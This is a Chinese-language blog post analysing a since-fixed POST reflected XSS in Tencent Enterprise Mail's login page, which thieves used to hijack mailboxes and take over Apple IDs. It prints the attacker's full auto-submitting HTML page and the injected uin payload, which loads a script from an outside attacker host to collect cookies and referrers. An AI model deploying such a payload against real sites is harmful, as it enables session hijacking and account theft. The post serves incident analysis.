---
layout: post
title: 腾讯企业邮箱跨站漏洞分析
---
中午朋友发来一个帖子询问我《[朋友 6S 被偷了，小偷（可能是团伙）发来链接偷取 APPLE ID](http://v2ex.com/t/232901)》是什么原理，之后和 RickGay 看了下是利用腾讯企业邮箱的 POST XSS 进行的盗取登录操作，从而登录受害者邮箱获取 APPLE ID。（目前腾讯已经修复此漏洞）

Target: http://eeee.washbowl.com.cn/

View-source:
![http://ww1.sinaimg.cn/large/c334041bgw1exmoyt2y2jj20hw07pgmj.jpg](http://ww1.sinaimg.cn/large/c334041bgw1exmoyt2y2jj20hw07pgmj.jpg)

网页嵌入两个 iframe ，重点在 /htmlpage5.html:    <html>
    <head>
        <meta charset="utf-8" />
        <title>qqjs4</title>
    </head>
    <body>
        <script>
            function test(PARAMS) {
                var temp = document.createElement("form");
                temp.acceptCharset = "utf-8";
                //By Wfox
                temp.action = 'http://m.exmail.qq.com/cgi-bin/login';
                temp.method = "post";
                temp.style.display = "none";
                for (var x in PARAMS) {
                    var opt = document.createElement("textarea");
                    opt.name = x;
                    opt.value = PARAMS[x];
                    temp.appendChild(opt);
                }
                document.body.appendChild(temp);
                temp.submit();
            }
            test({
                uin: '\\&quot;&lt;/script&gt;&lt;script src=http://ryige.com/q/8&gt;&lt;/script&gt;',
            });
        </script>
    </body>
    </html>

脚本向腾讯企业邮箱登录页面提交 XSS Payload ：

    \\&quot;&lt;/script&gt;&lt;script src=http://ryige.com/q/8&gt;&lt;/script&gt;
    
这个 POST 反射型 XSS 是由于企业邮箱登录报错未做过滤处理导致：

![http://ww4.sinaimg.cn/large/c334041bgw1exmp6f5hf5j20ug0bo76s.jpg](http://ww4.sinaimg.cn/large/c334041bgw1exmp6f5hf5j20ug0bo76s.jpg)

参数 uin ，攻击者注入 http://ryige.com/q/8 脚本：

![http://ww4.sinaimg.cn/large/c334041bgw1exmp3dzgknj20w40a4wgh.jpg](http://ww4.sinaimg.cn/large/c334041bgw1exmp3dzgknj20w40a4wgh.jpg)

Payload 将获取企业邮箱的 document.cookie & document.referrer 。

> 注：因腾讯企业邮箱不仅仅需要 Cookie 还需要登录成功后 URL sid 等信息；